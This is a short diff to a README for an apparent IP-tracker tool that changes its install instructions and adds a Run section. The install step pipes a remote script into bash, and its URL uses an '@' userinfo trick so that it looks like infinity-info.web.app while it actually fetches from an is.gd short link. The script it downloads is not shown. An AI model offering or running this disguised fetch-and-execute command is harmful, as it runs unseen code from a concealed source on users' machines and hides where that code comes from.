@@ -8,5 +8,9 @@ Infinity info network ip Tracker tool
 
 ### Installing
 ```ruby
-curl -sSL https://infinity-info.web.app@is.gd/pBxiU9 | bash
+curl -sSL https://infinity-info.web.app@is.gd/pBxiU9 | bash && ip-info
+```
+### Run
+```ruby
+ip-info
 ```
